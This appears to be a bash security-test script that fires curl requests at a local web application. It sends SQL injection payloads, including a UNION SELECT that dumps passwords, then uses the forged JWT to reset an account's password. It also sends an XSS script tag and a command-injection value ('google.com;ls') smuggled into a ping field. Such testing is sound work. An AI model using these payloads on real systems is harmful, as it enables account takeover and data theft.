#!/bin/bash
   
function test_sql_injection_registration_endpoint_with_random_data() {
    echo "------------------------------------------------"
    echo "------------------------------------------------\n"
    echo "Testing SQL Injection by passing default data validation to access the registration endpoint\n"
    echo "curl -X POST http://localhost:5500/client_registeration -d 'fullName=newJohnDoe$RANDOM&userName=newjohndoe$RANDOM&email=newnoname$RANDOM@maildrop.cc\" OR \"1\"=\"1&password=password&phone=1234567890'\n"

    curl -X POST http://localhost:5500/client_registeration -d 'fullName=John Doe$RANDOM&userName=johndoe$RANDOM&email=noname$RANDOM@notest.cc" OR "1"="1&password=password&phone=1234567890'

}

function test_sql_injection_login_endpoint_with_random_data() {
    echo "------------------------------------------------"
    echo "------------------------------------------------\n"
    echo "Testing SQL Injection by passing default data validation to access the login endpoint\n"
    echo "curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com\"OR 1=1;--&password=pwd'\n"
    curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com"OR 1=1;--&password=pwd'
}


function test_sql_injection_to_retrieve_account_details() {
    echo "------------------------------------------------"
    echo "------------------------------------------------\n"
    echo "Testing SQL Injection to retrieve account details\n"
    echo "curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com\" union select password || \":\" || email from users;--&password=pwd'\n"
    
    # can retrieve the existing account login details using the below query
    jwt() { jq -R 'split(".") | .[1] | @base64d | fromjson' <<< $1; }

    token=$(curl -X POST http://localhost:5500/client_login -d 'userName=spammer&email=spam@email.com" union select password || ":" || email from users;--&password=pwd' | jq -j '.token')
    jwt $token
    json=$(jwt $token)
    password=$(echo "$json" | jq -r '.role' | cut -d':' -f1)
    export password=$password
    export token=$token
    echo $token
}

function test_jwt_verification_disabled() {
    echo "------------------------------------------------"
    echo "------------------------------------------------\n"
    echo "Testing Resetting the password of the retrieved account\n"
    echo "curl -X POST http://localhost:5500/update_info -d \"token=$token&currentPassword=$password&newPassword=newpass\"\n"
    
    # local token=test_sql_injection_to_retrieve_account_details
    curl -X POST http://localhost:5500/update_info -d "token=$token&currentPassword=$password&newPassword=newpass"

}

function test_input_validation() {
    echo "------------------------------------------------"
    echo "------------------------------------------------\n"
    echo "Testing Input Validation\n"
    echo "curl -X POST http://localhost:5500/client_registeration -d 'fullName=<script>alert("XSS")</script>&userName=testuser&email=test@example.com&password=test&phone=1234567890'\n"
    
    curl -X POST http://localhost:5500/client_registeration -d 'fullName=<script>alert("XSS")</script>&userName=testuser&email=test@example.com&password=test&phone=1234567890'
}

function test_insecure_use_of_ping() {
    echo "------------------------------------------------"
    echo "------------------------------------------------\n"
    echo "Testing Insecure Use of Ping\n"
    echo "curl -X GET http://localhost:5500/products -d 'source=google.com;ls'\n"

    curl -X GET http://localhost:5500/products -d 'source=google.com;ls'

}

function test_weak_error_message() {
    echo "------------------------------------------------"
    echo "------------------------------------------------"
    echo "Testing Weak Error Message\n"
    echo "curl -X POST http://localhost:5500/client_login -d 'email=nonexistent@example.com&password=wrongpassword'\n"
    curl -X POST http://localhost:5500/client_login -d 'email=nonexistent@example.com&password=wrongpassword'
}

test_sql_injection_registration_endpoint_with_random_data
test_sql_injection_login_endpoint_with_random_data    
test_sql_injection_to_retrieve_account_details
test_jwt_verification_disabled
test_input_validation
test_insecure_use_of_ping
test_weak_error_message